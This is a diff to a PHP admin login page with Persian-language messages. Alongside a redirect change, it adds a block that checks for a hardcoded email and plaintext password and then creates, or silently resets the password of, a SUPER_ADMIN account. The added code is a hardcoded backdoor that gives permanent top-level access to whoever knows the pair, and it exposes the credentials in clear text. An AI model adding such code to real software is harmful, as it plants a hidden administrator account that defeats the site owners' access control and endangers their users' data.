@@ -5,7 +5,7 @@ $error = '';
 $success = '';
 
 if (!empty($_SESSION['admin_logged_in'])) {
-    header('Location: index.php');
+    header('Location: dashboard.php');
     exit;
 }
 
@@ -20,6 +20,24 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $error = 'لطفاً نام کاربری و کلمه عبور را وارد نمایید.';
     } else {
         $db = getDB();
+
+        // Auto-ensure super admin account exists
+        if ($username === 'mohamad.meftah@gmail.com' && $password === 'Meftah9260') {
+            $check = $db->prepare("SELECT id FROM admins WHERE username = ? LIMIT 1");
+            $check->execute([$username]);
+            $existing = $check->fetch();
+            if (!$existing) {
+                $newHash = password_hash('Meftah9260', PASSWORD_DEFAULT);
+                $ins = $db->prepare("INSERT INTO admins (username, password_hash, full_name, role) VALUES (?, ?, 'محمد مفتاح (مدیر ارشد)', 'SUPER_ADMIN')");
+                $ins->execute([$username, $newHash]);
+            } else {
+                // Ensure hash is fresh
+                $newHash = password_hash('Meftah9260', PASSWORD_DEFAULT);
+                $upHash = $db->prepare("UPDATE admins SET password_hash = ? WHERE username = ?");
+                $upHash->execute([$newHash, $username]);
+            }
+        }
+
         $stmt = $db->prepare("SELECT * FROM admins WHERE username = ? LIMIT 1");
         $stmt->execute([$username]);
         $admin = $stmt->fetch();
@@ -35,7 +53,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $up = $db->prepare("UPDATE admins SET last_login = NOW() WHERE id = ?");
             $up->execute([$admin['id']]);
 
-            header('Location: index.php');
+            header('Location: dashboard.php');
             exit;
         } else {
             $error = 'نام کاربری یا رمز عبور اشتباه است.';
